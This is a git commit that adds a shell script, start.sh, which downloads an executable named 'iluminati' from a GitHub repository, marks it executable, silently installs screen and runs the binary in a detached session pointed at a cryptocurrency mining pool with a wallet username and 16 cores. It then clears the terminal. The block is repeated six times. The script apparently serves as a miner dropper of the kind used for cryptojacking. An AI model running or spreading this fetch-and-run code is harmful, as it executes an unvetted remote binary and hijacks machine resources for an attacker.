669c6bc9b8ac6e72a327f6a2d6f76291056c0960
obisumila <obisumila@gmail.com>
2024-09-24 09:10:44 +0800

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,59 @@
+wget https://github.com/obisumila/sturdy-palm-tree/raw/refs/heads/main/iluminati ;
+chmod +x iluminati ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./iluminati --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen --cores 16 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/sturdy-palm-tree/raw/refs/heads/main/iluminati ;
+chmod +x iluminati ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./iluminati --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen --cores 16 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/sturdy-palm-tree/raw/refs/heads/main/iluminati ;
+chmod +x iluminati ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./iluminati --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen --cores 16 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/sturdy-palm-tree/raw/refs/heads/main/iluminati ;
+chmod +x iluminati ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./iluminati --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen --cores 16 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/sturdy-palm-tree/raw/refs/heads/main/iluminati ;
+chmod +x iluminati ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./iluminati --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen --cores 16 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/sturdy-palm-tree/raw/refs/heads/main/iluminati ;
+chmod +x iluminati ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./iluminati --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.ryzen --cores 16 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
